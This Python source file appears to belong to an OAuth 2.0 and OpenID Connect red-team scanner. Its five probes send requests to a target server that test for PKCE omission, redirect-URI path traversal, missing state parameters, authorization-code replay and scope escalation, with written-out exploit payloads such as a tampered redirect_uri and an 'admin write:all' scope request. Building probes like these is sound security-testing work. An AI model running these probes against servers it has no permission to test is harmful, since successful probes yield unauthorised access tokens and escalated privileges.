"""
Aegis Red Team Protocol Probes.
Active testing engine for OAuth 2.0 and OpenID Connect security specifications
(RFC 8414, RFC 7636, RFC 6749, RFC 6819).
Each probe attempts to exploit a specific OAuth misconfiguration.
"""

from typing import Dict, Any, Optional, Tuple
import httpx
import hashlib
import base64
import secrets
from aegis.core.state import VulnerabilityProof


def generate_pkce_pair() -> Tuple[str, str]:
    """Generates an RFC 7636 compliant PKCE code_verifier and code_challenge."""
    verifier = secrets.token_urlsafe(32)
    digest = hashlib.sha256(verifier.encode("ascii")).digest()
    challenge = base64.urlsafe_b64encode(digest).decode("ascii").rstrip("=")
    return verifier, challenge


class OAuthAttackProbes:
    """Suite of deterministic OAuth 2.0 / OIDC attack probes."""

    @staticmethod
    def test_pkce_downgrade(client: httpx.Client, base_url: str) -> Optional[VulnerabilityProof]:
        """
        Attempts a PKCE Downgrade / Omission attack.
        Step 1: Request auth code with valid code_challenge.
        Step 2: Attempt token exchange WITHOUT code_verifier.
        RFC 7636 mandates rejection. If 200 OK and token issued -> VULNERABLE.
        """
        verifier, challenge = generate_pkce_pair()
        auth_resp = client.get(
            f"{base_url}/authorize",
            params={
                "response_type": "code",
                "client_id": "client-app-123",
                "redirect_uri": "https://my-saas-app.com/callback",
                "scope": "read:profile",
                "state": "anti_csrf_xyz",
                "code_challenge": challenge,
                "code_challenge_method": "S256",
            },
        )
        if auth_resp.status_code != 200:
            return None

        code = auth_resp.json().get("code")
        if not code:
            return None

        # Exploit: Exchange code WITHOUT sending code_verifier
        token_resp = client.post(
            f"{base_url}/token",
            json={
                "grant_type": "authorization_code",
                "code": code,
                "redirect_uri": "https://my-saas-app.com/callback",
                "client_id": "client-app-123",
                # code_verifier omitted!
            },
        )

        if token_resp.status_code == 200 and "access_token" in token_resp.json():
            return VulnerabilityProof(
                vector_id="OAUTH-PKCE-DOWNGRADE",
                category="PKCE",
                description="Token endpoint successfully issued access token without code_verifier when code_challenge was established.",
                exploit_payload={"code": code, "omitted_field": "code_verifier"},
                target_endpoint="/token",
                response_status=token_resp.status_code,
                response_body=token_resp.json(),
                poc_summary="POST /token without code_verifier yielded 200 OK with access token.",
            )
        return None

    @staticmethod
    def test_redirect_traversal(client: httpx.Client, base_url: str) -> Optional[VulnerabilityProof]:
        """
        Attempts Redirect URI Directory Traversal / Path Bypasses.
        Tests if target allows path tampering like /callback/../../attacker
        RFC 6749 Section 3.1.2 mandates exact URI comparison or strict whitelist.
        """
        tampered_uri = "https://my-saas-app.com/callback/../../attacker_leak"
        auth_resp = client.get(
            f"{base_url}/authorize",
            params={
                "response_type": "code",
                "client_id": "client-app-123",
                "redirect_uri": tampered_uri,
                "scope": "read:profile",
                "state": "state_123",
            },
        )

        if auth_resp.status_code == 200 and "code" in auth_resp.json():
            return VulnerabilityProof(
                vector_id="OAUTH-REDIRECT-TRAVERSAL",
                category="REDIRECT_URI",
                description="Authorization endpoint accepted path-traversal redirect_uri bypassing whitelist.",
                exploit_payload={"redirect_uri": tampered_uri},
                target_endpoint="/authorize",
                response_status=auth_resp.status_code,
                response_body=auth_resp.json(),
                poc_summary=f"GET /authorize with redirect_uri={tampered_uri} returned authorization code.",
            )
        return None

    @staticmethod
    def test_state_csrf(client: httpx.Client, base_url: str) -> Optional[VulnerabilityProof]:
        """
        Tests if the authorization server accepts requests without state parameter.
        RFC 6749 Section 10.12 mandates CSRF protection for client/server flows.
        """
        auth_resp = client.get(
            f"{base_url}/authorize",
            params={
                "response_type": "code",
                "client_id": "client-app-123",
                "redirect_uri": "https://my-saas-app.com/callback",
                "scope": "read:profile",
                # state parameter omitted!
            },
        )

        if auth_resp.status_code == 200 and "code" in auth_resp.json():
            return VulnerabilityProof(
                vector_id="OAUTH-STATE-CSRF",
                category="CSRF",
                description="Authorization endpoint granted authorization code without required state parameter.",
                exploit_payload={"omitted_field": "state"},
                target_endpoint="/authorize",
                response_status=auth_resp.status_code,
                response_body=auth_resp.json(),
                poc_summary="GET /authorize without state returned 200 OK with authorization code, exposing user to login CSRF.",
            )
        return None

    @staticmethod
    def test_code_replay(client: httpx.Client, base_url: str) -> Optional[VulnerabilityProof]:
        """
        Tests if an authorization code can be redeemed more than once.
        RFC 6749 Section 4.1.2 mandates authorization codes MUST be single-use.
        """
        verifier, challenge = generate_pkce_pair()
        auth_resp = client.get(
            f"{base_url}/authorize",
            params={
                "response_type": "code",
                "client_id": "client-app-123",
                "redirect_uri": "https://my-saas-app.com/callback",
                "scope": "read:profile",
                "state": "state_abc",
                "code_challenge": challenge,
                "code_challenge_method": "S256",
            },
        )
        if auth_resp.status_code != 200:
            return None

        code = auth_resp.json().get("code")
        token_payload = {
            "grant_type": "authorization_code",
            "code": code,
            "redirect_uri": "https://my-saas-app.com/callback",
            "client_id": "client-app-123",
            "code_verifier": verifier,
        }

        # 1st Redemption (legitimate)
        resp1 = client.post(f"{base_url}/token", json=token_payload)
        if resp1.status_code != 200:
            return None

        # 2nd Redemption (replay attempt)
        resp2 = client.post(f"{base_url}/token", json=token_payload)
        if resp2.status_code == 200 and "access_token" in resp2.json():
            return VulnerabilityProof(
                vector_id="OAUTH-CODE-REPLAY",
                category="REPLAY",
                description="Authorization code was successfully redeemed multiple times for different access tokens.",
                exploit_payload={"replayed_code": code},
                target_endpoint="/token",
                response_status=resp2.status_code,
                response_body=resp2.json(),
                poc_summary=f"Replay of code {code} produced second access token: {resp2.json().get('access_token')}.",
            )
        return None

    @staticmethod
    def test_scope_escalation(client: httpx.Client, base_url: str) -> Optional[VulnerabilityProof]:
        """
        Tests if a client can request elevated unconsented scopes at token endpoint.
        RFC 6749 Section 3.3.
        """
        verifier, challenge = generate_pkce_pair()
        auth_resp = client.get(
            f"{base_url}/authorize",
            params={
                "response_type": "code",
                "client_id": "client-app-123",
                "redirect_uri": "https://my-saas-app.com/callback",
                "scope": "read:profile",  # User only consented to read:profile
                "state": "state_scope",
                "code_challenge": challenge,
                "code_challenge_method": "S256",
            },
        )
        if auth_resp.status_code != 200:
            return None

        code = auth_resp.json().get("code")
        # Exploit: request unauthorized administrative scope
        token_resp = client.post(
            f"{base_url}/token",
            json={
                "grant_type": "authorization_code",
                "code": code,
                "redirect_uri": "https://my-saas-app.com/callback",
                "client_id": "client-app-123",
                "code_verifier": verifier,
                "scope": "read:profile admin write:all",  # Escalation payload
            },
        )

        if token_resp.status_code == 200:
            body = token_resp.json()
            granted_scope = body.get("scope", "")
            if "admin" in granted_scope or "write:all" in granted_scope:
                return VulnerabilityProof(
                    vector_id="OAUTH-SCOPE-ESCALATION",
                    category="PRIVILEGE_ESCALATION",
                    description="Token endpoint granted elevated unconsented scopes (admin, write:all).",
                    exploit_payload={"requested_scope": "read:profile admin write:all", "granted_scope": granted_scope},
                    target_endpoint="/token",
                    response_status=token_resp.status_code,
                    response_body=body,
                    poc_summary=f"Requested scope escalation succeeded. Granted scope: {granted_scope}",
                )
        return None
